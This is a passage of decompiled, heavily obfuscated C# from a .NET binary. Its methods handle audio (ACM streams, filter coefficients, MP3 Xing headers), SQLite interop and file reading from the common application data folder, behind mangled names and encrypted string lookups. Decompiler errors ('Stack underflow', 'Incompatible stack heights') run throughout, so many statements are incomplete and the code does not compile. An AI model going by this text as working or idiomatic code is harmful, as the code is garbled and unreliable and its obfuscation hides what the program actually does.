		static void _0001(_001B._0010 P_0)
		{
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0030: Incompatible stack heights: 0 vs 2
			//IL_0037: Incompatible stack heights: 0 vs 1
			_ = ((_001B._0010)/*Error near IL_0007: Stack underflow*/)._0001;
			float num = ((_001B._0010)/*Error near IL_000e: Stack underflow*/)._0001;
			((global::_0015._000F)/*Error near IL_0037: Stack underflow*/)._0001(num);
			_001D._000F obj = (_001D._000F)/*Error near IL_0011: Stack underflow*/;
			P_0._0002 = obj.Left;
			P_0._0003 = obj.Right;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static _001D._0016 _0001(float _0002, float _0003, float _0004)
		{
			//IL_0011: Unknown result type (might be due to invalid IL or missing references)
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_0082: Incompatible stack heights: 0 vs 3
			//IL_0085: Incompatible stack heights: 0 vs 2
			//IL_008c: Expected F8, but got Unknown
			//IL_008c: Incompatible stack heights: 0 vs 2
			_ = global::_0015._009B_0002;
			_ = Math.PI * 2.0;
			double num = (double)/*Error near IL_0011: Stack underflow*/;
			_ = /*Error near IL_0012: Stack underflow*/* num;
			double num2 = (double)/*Error near IL_0015: Stack underflow*/;
			Math.Cos(/*Error near IL_0016: Stack underflow*/ / num2);
			double num3 = (double)/*Error near IL_001a: Stack underflow*/;
			double num4 = /*Error near IL_001f: Stack underflow*/((double)/*Error near IL_001f: Stack underflow*/) / (double)(2f * _0004);
			double num5 = 1.0 - num4;
			double num6 = -2.0 * num3;
			double num7 = 1.0 + num4;
			double num8 = 1.0 + num4;
			double num9 = -2.0 * num3;
			double num10 = 1.0 - num4;
			return new _001D._0016(num8, num9, num10, num5, num6, num7);
		}

		[DllImport("Msacm32.dll", EntryPoint = "acmStreamOpen")]
		static extern MmResult _0001(out IntPtr _0002, IntPtr _0003, [In][MarshalAs(UnmanagedType.CustomMarshaler, MarshalType = "NAudio.Wave.WaveFormatCustomMarshaler")] global::_0005._0005 _0004, [In][MarshalAs(UnmanagedType.CustomMarshaler, MarshalType = "NAudio.Wave.WaveFormatCustomMarshaler")] global::_0005._0005 _0005, [In] global::_0017._0012 _0006, IntPtr _0007, IntPtr _0008, global::_0007._000F _000E);

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_bind_parameter_name_interop")]
		static extern IntPtr _0001(IntPtr _0002, int _0003, ref int _0004);

		static global::_0014._0004 _0001(IEnumerable<KeyValuePair<string, string>> _0002)
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			//IL_000f: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			global::_0014._0004._0001((IEnumerable<KeyValuePair<string, string>>)/*Error near IL_000f: Stack underflow*/);
			_0018._0001((Stream)/*Error near IL_0016: Stack underflow*/);
			return (global::_0014._0004)/*Error near IL_0007: Stack underflow*/;
		}

		static void _0001(global::_0006._0006 _0002, string _0003)
		{
			//IL_0095: Incompatible stack heights: 0 vs 1
			//IL_009b: Incompatible stack heights: 0 vs 1
			//IL_00a5: Incompatible stack heights: 0 vs 1
			_ = ((global::_0006._0006)/*Error near IL_00a5: Stack underflow*/).WaveFormat;
			global::_0004._0008 obj = new global::_0004._0008((string)/*Error near IL_0014: Stack underflow*/, (global::_0005._0005)/*Error near IL_0014: Stack underflow*/);
			try
			{
				byte[] array = new byte[16384];
				while (global::_0012._007E_0091_0002(_0002) < global::_0012._007E_0090_0002(_0002))
				{
					int num = _0016_0002._0018_0005((int)(global::_0012._007E_0090_0002(_0002) - global::_0012._007E_0091_0002(_0002)), array.Length);
					int num2 = _0082._007E_0006_0004(_0002, array, 0, num);
					if (num2 == 0)
					{
						break;
					}
					_0083._007E_0008_0004(obj, array, 0, num2);
				}
			}
			finally
			{
				if (obj != null)
				{
					global::_0008._007E_0098(obj);
				}
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("winmm.dll", EntryPoint = "midiOutGetVolume")]
		static extern MmResult _0001(IntPtr _0002, ref int _0003);

		static void _0001(global::_0007._001C._0001 _0002, bool _0003)
		{
			//IL_005f: Incompatible stack heights: 0 vs 1
			//IL_0065: Incompatible stack heights: 0 vs 1
			int num = ((global::_0007._001C._0001)/*Error near IL_0007: Stack underflow*/)._0002;
			if ((int)/*Error near IL_000d: Stack underflow*/ != 0 && num > 0)
			{
				num--;
			}
			Queue<WeakReference> queue = _0002._0001;
			if (queue == null)
			{
				return;
			}
			while (queue.Count > num)
			{
				WeakReference weakReference = queue.Dequeue();
				if (weakReference != null)
				{
					global::_000E._001F obj = _0083_0003._007E_001A_0007(weakReference) as global::_000E._001F;
					if (obj != null)
					{
						global::_0008._007E_0007_0002(obj);
					}
					_0091_0002._009E_0005(obj);
				}
			}
		}

		static bool _0001(_0019._007F _0002, _0013 _0003, SQLiteConnectionFlags _0004, global::_0012._0014 _0005)
		{
			//IL_0078: Incompatible stack heights: 0 vs 1
			//IL_0082: Incompatible stack heights: 0 vs 1
			//IL_008c: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				_0080._0014._0001(107358497);
				new ArgumentNullException((string?)/*Error near IL_008c: Stack underflow*/);
				throw /*Error near IL_0011: Stack underflow*/;
			}
			if (_0002 == null)
			{
				throw new ArgumentNullException(_0080._0014._0001(107403438));
			}
			if (_0005 == null)
			{
				throw new ArgumentNullException(_0080._0014._0001(107403445));
			}
			global::_0016._001C obj = _0002._0001;
			string text = _0002._0001;
			if (obj != global::_0016._001C._0003)
			{
				bool flag = _0005 is _001C._0017;
				return _0003._0001(text, _0002._0001, flag, null, null, null, _0008: false) == _0080._0017._0002;
			}
			return _0003._0001(text, null, null, _0005: false) == _0080._0017._0002;
		}

		static uint _0001(string _0002)
		{
			//IL_003e: Incompatible stack heights: 0 vs 1
			uint num = default(uint);
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				num = 2166136261u;
				int i;
				if (4u != 0)
				{
					i = 0;
				}
				for (; i < global::_001A._007E_0016_0003(_0002); i++)
				{
					num = (_009F_0004._007E_0088_000E(_0002, i) ^ num) * 16777619;
				}
			}
			return num;
		}

		static ulong _0001(double _0002)
		{
			//IL_000b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0019: Incompatible stack heights: 0 vs 1
			return (ulong)((long)(/*Error near IL_000c: Stack underflow*/ - 2147483648.0) + int.MaxValue + 1);
		}

		static void _0001(_001D._0016 _0002, float _0003, float _0004, float _0005, float P_4)
		{
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_001b: Unknown result type (might be due to invalid IL or missing references)
			//IL_001c: Unknown result type (might be due to invalid IL or missing references)
			//IL_00b7: Incompatible stack heights: 0 vs 3
			//IL_00bd: Incompatible stack heights: 0 vs 2
			//IL_00c7: Expected F8, but got Unknown
			//IL_00c7: Incompatible stack heights: 0 vs 2
			_ = global::_0015._009B_0002;
			_ = Math.PI * 2.0;
			double num = (double)/*Error near IL_0014: Stack underflow*/;
			_ = /*Error near IL_0015: Stack underflow*/* num;
			double num2 = (double)/*Error near IL_001b: Stack underflow*/;
			Math.Cos(/*Error near IL_001c: Stack underflow*/ / num2);
			double num3 = (double)/*Error near IL_0023: Stack underflow*/;
			double num4 = /*Error near IL_0028: Stack underflow*/((double)/*Error near IL_0028: Stack underflow*/) / (double)(2f * _0005);
			double num5 = global::_0014._0095_0002(10.0, P_4 / 40f);
			double num6 = 1.0 + num4 * num5;
			double num7 = -2.0 * num3;
			double num8 = 1.0 - num4 * num5;
			double num9 = 1.0 + num4 / num5;
			double num10 = -2.0 * num3;
			double num11 = 1.0 - num4 / num5;
			_0018._0001(num6, _0002, num8, num10, num9, num11, num7);
		}

		static string _0001(DateTime _0002)
		{
			//IL_007c: Incompatible stack heights: 0 vs 1
			//IL_0088: Incompatible stack heights: 0 vs 2
			new StringBuilder();
			StringBuilder stringBuilder = default(StringBuilder);
			if (0 == 0)
			{
				stringBuilder = (StringBuilder)/*Error near IL_0082: Stack underflow*/;
			}
			_ = _008B_0002._007E_0094_0005;
			string text = _0002.ToString(_0080._0014._0001(107404975));
			/*Error near IL_0023: Stack underflow*/((object)/*Error near IL_0023: Stack underflow*/, text);
			_009B_0003._007E_009B_0007(stringBuilder, ' ');
			_0081_0005._007E_0011_000F(stringBuilder, _0002.Kind);
			_009B_0003._007E_009B_0007(stringBuilder, ' ');
			_0082_0005._007E_0012_000F(stringBuilder, _0002.Ticks);
			return global::_0002._007E_0006(stringBuilder);
		}

		[DllImport("msacm32.dll", EntryPoint = "acmDriverAdd")]
		static extern MmResult _0001(out IntPtr _0002, IntPtr _0003, IntPtr _0004, int _0005, global::_0014._0007 _0006);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static global::_0014._0017 _0001(_001A._0018 P_0)
		{
			//IL_0026: Incompatible stack heights: 0 vs 2
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0030: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr intPtr = ((_001A._0018)/*Error near IL_000c: Stack underflow*/)._0001;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_002d: Stack underflow*/(intPtr, zero);
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
			{
				return global::_0014._0017._0008;
			}
			return _0018._0001(((_001A._0018)/*Error near IL_001f: Stack underflow*/)._0001);
		}

		static void _0001(_001B._000F _0002, global::_0006._0006 P_1)
		{
			//IL_0120: Incompatible stack heights: 0 vs 1
			//IL_012a: Incompatible stack heights: 0 vs 1
			//IL_0134: Incompatible stack heights: 0 vs 1
			_ = ((global::_0006._0006)/*Error near IL_012a: Stack underflow*/).WaveFormat;
			if (((global::_0005._0005)/*Error near IL_000f: Stack underflow*/)._0001 != WaveFormatEncoding.IeeeFloat)
			{
				_0080._0014._0001(107358512);
				throw new ArgumentException(paramName: _0080._0014._0001(107357931), message: (string?)/*Error near IL_002b: Stack underflow*/);
			}
			if (P_1.WaveFormat._0003 != 32)
			{
				throw new ArgumentException(_0080._0014._0001(107357946), _0080._0014._0001(107357931));
			}
			if (_0002._0001.Count == 0)
			{
				int num = P_1.WaveFormat._0001;
				int num2 = P_1.WaveFormat._0001;
				_0002._0001 = _0018._0001(num, num2);
			}
			else if (!_0087_0004._007E_009A_0008(P_1.WaveFormat, _0002._0001))
			{
				throw new ArgumentException(_0080._0014._0001(107357861), _0080._0014._0001(107357931));
			}
			object obj = _0002._0001;
			_0091_0002._009C_0005(obj);
			try
			{
				_0002._0001.Add(P_1);
				_0002._0001 = _0008_0003._0088_0006(_0002._0001, global::_0012._007E_0090_0002(P_1));
				_007F_0002._007E_0083_0005(P_1, global::_0012._007E_0091_0002(_0002));
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}

		unsafe static _0080._0017 _0001(bool _0002, ref uint _0003, int _0004, bool _0005, ref bool _0006, ref int _0007)
		{
			//IL_0011: Incompatible stack heights: 0 vs 1
			//IL_0014: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 1
			return _0018._0001(ref *(bool*)/*Error near IL_000e: Stack underflow*/, (byte)/*Error near IL_000e: Stack underflow*/ != 0, ref *(int*)/*Error near IL_000e: Stack underflow*/, _0002, ref _0003, _0004);
		}

		static string _0001(_0014 _0002, int P_1)
		{
			//IL_000c: Invalid comparison between Unknown and I4
			//IL_0043: Incompatible stack heights: 0 vs 1
			//IL_004d: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_004a: Stack underflow*/);
			int num = _0002._0004;
			if ((int)/*Error near IL_000e: Stack underflow*/ >= num && _0002._0001 != null)
			{
				return _0018._0001(_0002._0001, P_1 - _0002._0004);
			}
			return _0002._0001._0001._0004(_0002._0001, P_1);
		}

		static void _0001(global::_0008._0001 _0002, string P_1)
		{
			//IL_00f2: Incompatible stack heights: 0 vs 3
			//IL_00fc: Incompatible stack heights: 0 vs 1
			//IL_0106: Incompatible stack heights: 0 vs 1
			try
			{
				_ = global::_001C._0097_0003;
				_ = global::_000F._008B_0002;
				_0018._0001();
				string text = global::_0015._0001._0005;
				/*Error near IL_00fc: Stack underflow*/((string)/*Error near IL_00fc: Stack underflow*/, text);
				/*Error near IL_0106: Stack underflow*/((string)/*Error near IL_0106: Stack underflow*/);
				if ((int)/*Error near IL_0020: Stack underflow*/ == 0)
				{
					return;
				}
				string text2 = global::_001E._009D_0003(global::_000F._008B_0002(_0018._0001(), global::_0015._0001._0005));
				string text3 = global::_000F._008B_0002(_0018._0001(), global::_0015._0001._0005);
				FileStream fileStream = _0083_0005._0013_000F(text3, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				byte[] array;
				try
				{
					StreamReader streamReader = new StreamReader(fileStream);
					try
					{
						array = _0018._0001(global::_0002._007E_001B(streamReader));
					}
					finally
					{
						if (streamReader != null)
						{
							global::_0008._007E_0098(streamReader);
						}
					}
				}
				finally
				{
					if (fileStream != null)
					{
						global::_0008._007E_0098(fileStream);
					}
				}
				if (array.Length != 0)
				{
					_0018._0001(_0002, array, _0084._000F_0004(_0080._0014._0001(107397018), P_1, _0080._0014._0001(107396973), text2), false);
				}
			}
			catch
			{
			}
		}

		static byte[] _0001(int _0002, byte[] _0003)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 2
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				_ = ((Array)/*Error near IL_0007: Stack underflow*/).Length;
				if (/*Error near IL_000c: Stack underflow*/ >= /*Error near IL_000c: Stack underflow*/)
				{
					goto IL_0014;
				}
			}
			_0003 = new byte[_0002];
			goto IL_0014;
			IL_0014:
			return _0003;
		}

		static int _0001(_001F._0019 _0002, string P_1)
		{
			//IL_003d: Incompatible stack heights: 0 vs 2
			//IL_0040: Incompatible stack heights: 0 vs 1
			for (int i = 0; i < _0002._0001.Length; i++)
			{
				_ = _009D_0003._009D_0007;
				string text = ((_001F._0019)/*Error near IL_0013: Stack underflow*/)._0001[i]._0003;
				if (/*Error near IL_0024: Stack underflow*/((string)/*Error near IL_0024: Stack underflow*/, text, StringComparison.OrdinalIgnoreCase) == 0)
				{
					return i;
				}
			}
			return -1;
		}

		static double _0001(_001A._0018 P_0)
		{
			//IL_002d: Incompatible stack heights: 0 vs 2
			//IL_0034: Incompatible stack heights: 0 vs 1
			//IL_0037: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr intPtr = ((_001A._0018)/*Error near IL_000c: Stack underflow*/)._0001;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_0034: Stack underflow*/(intPtr, zero);
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
			{
				return 0.0;
			}
			return _0018._0001(((_001A._0018)/*Error near IL_0026: Stack underflow*/)._0001);
		}

		static void _0001(global::_0002._0007 _0002, string _0003)
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0014: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			new global::_0001._0008((global::_0002._0007)/*Error near IL_0014: Stack underflow*/);
			_0018._0001((_001C._0004)/*Error near IL_000b: Stack underflow*/, (string)/*Error near IL_000b: Stack underflow*/);
		}

		static bool _0001(global::_0007._001A _0002, global::_0017._0080 _0003, string P_2)
		{
			//IL_0049: Incompatible stack heights: 0 vs 1
			//IL_0053: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0017._0080)/*Error near IL_0050: Stack underflow*/);
			if ((int)/*Error near IL_0008: Stack underflow*/ == 0)
			{
				throw new ArgumentNullException(_0080._0014._0001(107357796));
			}
			if (_0003._0001 == null)
			{
				return false;
			}
			if (_0002 == null)
			{
				return _0003._0001.Remove(P_2);
			}
			_0002._0001 = P_2;
			_0003._0001[P_2] = _0002;
			return true;
		}

		static global::_0017._0007 _0001(global::_0005._0003 _0002)
		{
			//IL_00ff: Incompatible stack heights: 0 vs 1
			//IL_010b: Incompatible stack heights: 0 vs 1
			new global::_0017._0007();
			global::_0017._0007 obj = (global::_0017._0007)/*Error near IL_0105: Stack underflow*/;
			((global::_0017._0007)/*Error near IL_0015: Stack underflow*/)._0001 = _0002;
			int num = 0;
			if (_0002.MpegVersion == global::_0004._0006._0004)
			{
				num = ((_0002.ChannelMode == ChannelMode.Mono) ? 21 : 36);
			}
			else
			{
				if (_0002.MpegVersion != global::_0004._0006._0003)
				{
					return null;
				}
				num = ((_0002.ChannelMode == ChannelMode.Mono) ? 13 : 21);
			}
			if (_0002.RawData[num] == 88 && _0002.RawData[num + 1] == 105 && _0002.RawData[num + 2] == 110 && _0002.RawData[num + 3] == 103)
			{
				obj._0002 = num;
				num += 4;
				int num2 = _0018._0001(_0002.RawData, num);
				num += 4;
				if (((uint)num2 & (true ? 1u : 0u)) != 0)
				{
					obj._0005 = num;
					num += 4;
				}
				if (((uint)num2 & 2u) != 0)
				{
					obj._0006 = num;
					num += 4;
				}
				if (((uint)num2 & 4u) != 0)
				{
					obj._0004 = num;
					num += 100;
				}
				if (((uint)num2 & 8u) != 0)
				{
					obj._0001 = _0018._0001(_0002.RawData, num);
					num += 4;
				}
				obj._0003 = num;
				return obj;
			}
			return null;
		}

		static void _0001(_001A._0005 _0002, BinaryWriter P_1)
		{
			//IL_0027: Incompatible stack heights: 0 vs 2
			//IL_002a: Incompatible stack heights: 0 vs 1
			//IL_0031: Incompatible stack heights: 0 vs 1
			_ = _009E_0002._007E_001B_0006;
			long num = ((_001A._0005)/*Error near IL_000e: Stack underflow*/)._0001;
			/*Error near IL_0031: Stack underflow*/((object)/*Error near IL_0031: Stack underflow*/, (int)num, SeekOrigin.Begin);
			_0084_0005._007E_0014_000F(P_1, (uint)_0002._0003);
		}

		static int _0001(global::_0017._007F._0008 P_0)
		{
			//IL_001a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0020: Unknown result type (might be due to invalid IL or missing references)
			//IL_0022: Expected I4, but got Unknown
			//IL_005e: Incompatible stack heights: 0 vs 1
			//IL_0061: Incompatible stack heights: 0 vs 2
			//IL_0064: Incompatible stack heights: 0 vs 2
			_ = ((global::_0017._007F._0008)/*Error near IL_0007: Stack underflow*/)._0010 << 5;
			_ = ((global::_0017._007F._0008)/*Error near IL_0010: Stack underflow*/)._0001;
			int num = ((global::_0017._007F._0008)/*Error near IL_0017: Stack underflow*/)._0014;
			byte num2 = ((byte[])/*Error near IL_001a: Stack underflow*/)[num + 2];
			int num3 = (/*Error near IL_001b: Stack underflow*/ ^ num2) & 0x7FFF;
			short num4 = (P_0._0002[P_0._0014 & 0x7FFF] = P_0._0001[num3]);
			P_0._0001[num3] = (short)P_0._0014;
			P_0._0010 = num3;
			return num4 & 0xFFFF;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static global::_0010._001C _0001(global::_0017._0080 P_0)
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0017._0080)/*Error near IL_0014: Stack underflow*/);
			return new global::_0010._001C((global::_0017._0080)/*Error near IL_000b: Stack underflow*/);
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_db_handle")]
		static extern IntPtr _0001(IntPtr _0002);

		static IntPtr _0001(int _0002)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			//IL_0010: Incompatible stack heights: 0 vs 1
			_0018._0001((int)/*Error near IL_0010: Stack underflow*/);
			return (IntPtr)/*Error near IL_0006: Stack underflow*/;
		}

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_close_interop")]
		static extern _0080._0017 _0001(IntPtr _0002);

		static global::_0004._0016 _0001(_0014 _0002, int _0003, bool _0004)
		{
			//IL_013f: Incompatible stack heights: 0 vs 1
			//IL_0149: Incompatible stack heights: 0 vs 1
			_0018._0001((_0014)/*Error near IL_0149: Stack underflow*/);
			global::_0017._0080 obj = (global::_0017._0080)/*Error near IL_014f: Stack underflow*/;
			if (obj == null)
			{
				throw new InvalidOperationException(_0080._0014._0001(107357815));
			}
			if (!(obj._0001 is global::_0002._0019 obj2))
			{
				throw new InvalidOperationException(_0080._0014._0001(107357782));
			}
			global::_000E._001F obj3 = obj2._0001;
			if (obj3 == null)
			{
				throw new InvalidOperationException(_0080._0014._0001(107357745));
			}
			long? num = _0018._0001(_0002, _0003);
			if (!num.HasValue)
			{
				throw new InvalidOperationException(_0080._0014._0001(107358180));
			}
			global::_0010._0080 obj4 = null;
			try
			{
			}
			finally
			{
				IntPtr zero = IntPtr.Zero;
				_0080._0017 obj5 = _0018._0001(global::_000E._001F._0001(obj2._0001), _0018._0001(_0018._0001(_0002, _0003)), _0018._0001(_0018._0001(_0002, _0003)), _0018._0001(_009E_0003._007E_0002_0008(_0002, _0003)), num.Value, (!_0004) ? 1 : 0, ref zero);
				if (obj5 != 0)
				{
					throw new SQLiteException(obj5, null);
				}
				obj4 = new global::_0010._0080(obj3, zero);
			}
			global::_0017._0080._0001(null, new global::_0002._001A(global::_000E._001D._0010, null, null, null, _0002, obj4, null, new object[4]
			{
				_0091._0080_0004(typeof(global::_0004._0016).TypeHandle),
				_0002,
				_0003,
				_0004
			}));
			return new global::_0004._0016(obj2, obj4);
		}

		static string _0001()
		{
			//IL_0021: Incompatible stack heights: 0 vs 2
			//IL_0028: Incompatible stack heights: 0 vs 1
			_ = global::_000F._008B_0002;
			_0086_0005._0015_000F(Environment.SpecialFolder.CommonApplicationData);
			string text = global::_0015._0001._001B;
			/*Error near IL_0028: Stack underflow*/((string)/*Error near IL_0028: Stack underflow*/, text);
			return (string)/*Error near IL_001a: Stack underflow*/;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_aggregate_count")]
		static extern int _0001(IntPtr _0002);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static bool _0001(global::_0016._001E P_0)
		{
			//IL_0007: Invalid comparison between Unknown and I4
			//IL_0012: Incompatible stack heights: 0 vs 1
			_0018._0001();
			if ((int)/*Error near IL_0009: Stack underflow*/ >= 3008002)
			{
				return true;
			}
			return false;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static global::_0017._0080 _0001()
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_0033: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107358151);
			new global::_0017._0080((string)/*Error near IL_0033: Stack underflow*/);
			global::_0017._0080 obj = (global::_0017._0080)/*Error near IL_0036: Stack underflow*/;
			try
			{
				global::_0008._007E_0016_0002(obj);
			}
			catch (Exception)
			{
			}
			return obj;
		}

		static string _0001(object _0002)
		{
			//IL_002e: Incompatible stack heights: 0 vs 1
			//IL_0031: Incompatible stack heights: 0 vs 1
			//IL_0034: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				return null;
			}
			if (/*Error near IL_0009: Stack underflow*/ is string)
			{
				return (string)/*Error near IL_0012: Stack underflow*/;
			}
			if (_0002 == DBNull.Value)
			{
				return null;
			}
			return global::_0002._007E_0006(_0002);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(global::_0017._007F._0003 P_0)
		{
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			int num = 0;
			((global::_0017._007F._0003)/*Error near IL_000d: Stack underflow*/)._0003 = (int)/*Error near IL_000d: Stack underflow*/;
			((global::_0017._007F._0003)/*Error near IL_0013: Stack underflow*/)._0004 = num;
		}

		static void _0001()
		{
			try
			{
				global::_0002._0017._0001();
			}
			catch (Exception)
			{
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static global::_0010._001C _0001(_001D._0019 P_0)
		{
			//IL_0017: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 2
			_0018._0001((_001D._0019)/*Error near IL_001e: Stack underflow*/);
			_ = _008D_0004._000E_000E;
			return (global::_0010._001C)/*Error near IL_0010: Stack underflow*/((object)/*Error near IL_0010: Stack underflow*/);
		}

		static global::_0004._0016 _0001(int _0002, _001F._0019 _0003, bool P_2)
		{
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 1
			_0018._0001((_001F._0019)/*Error near IL_005c: Stack underflow*/, (int)/*Error near IL_005c: Stack underflow*/);
			if (_0003._0001[_0002]._0001 != null)
			{
				_0014 obj = _0003._0001[_0002]._0001._0001;
				int num = _0003._0001[_0002]._0004;
				return _0018._0001(num, obj, P_2);
			}
			throw new InvalidCastException();
		}

		static double _0001(global::_0003._0004 P_0)
		{
			//IL_0017: Unknown result type (might be due to invalid IL or missing references)
			//IL_0021: Unknown result type (might be due to invalid IL or missing references)
			//IL_0023: Expected F8, but got Unknown
			//IL_0024: Incompatible stack heights: 0 vs 3
			//IL_002b: Incompatible stack heights: 0 vs 1
			_ = 2.0;
			_ = _0087_0005._007E_0016_000F;
			Random random = ((global::_0003._0004)/*Error near IL_0015: Stack underflow*/)._0001;
			/*Error near IL_002b: Stack underflow*/(random);
			return /*Error near IL_0018: Stack underflow*/* /*Error near IL_0018: Stack underflow*/- 1.0;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_result_text")]
		static extern void _0001(IntPtr _0002, byte[] _0003, int _0004, IntPtr _0005);

		static void _0001(_001D._0019 P_0)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			if (((_001D._0019)/*Error near IL_0007: Stack underflow*/)._0001)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(_001D._0019).TypeHandle);
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				throw new ObjectDisposedException((string?)/*Error near IL_0021: Stack underflow*/);
			}
		}

		static IEnumerable<_001B._0004> _0001(_001E._0004 _0002, int P_1)
		{
			//IL_0019: Incompatible stack heights: 0 vs 3
			//IL_001c: Incompatible stack heights: 0 vs 2
			new _001E._0004._0002(-2);
			((_001E._0004._0002)/*Error near IL_000f: Stack underflow*/)._0001 = (_001E._0004)/*Error near IL_000f: Stack underflow*/;
			/*Error near IL_000f: Stack underflow*/;
			((_001E._0004._0002)/*Error near IL_0017: Stack underflow*/)._0005 = (int)/*Error near IL_0017: Stack underflow*/;
			return (IEnumerable<_001B._0004>)/*Error near IL_0018: Stack underflow*/;
		}

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_prepare_interop")]
		static extern _0080._0017 _0001(IntPtr _0002, IntPtr _0003, int _0004, ref IntPtr _0005, ref IntPtr _0006, ref int _0007);

		static long _0001(global::_0005._0008 _0002, long P_1)
		{
			//IL_001c: Unknown result type (might be due to invalid IL or missing references)
			//IL_001e: Expected F8, but got Unknown
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 2
			//IL_005c: Incompatible stack heights: 0 vs 1
			_ = (double)((global::_0005._0008)/*Error near IL_0007: Stack underflow*/)._0001._0002;
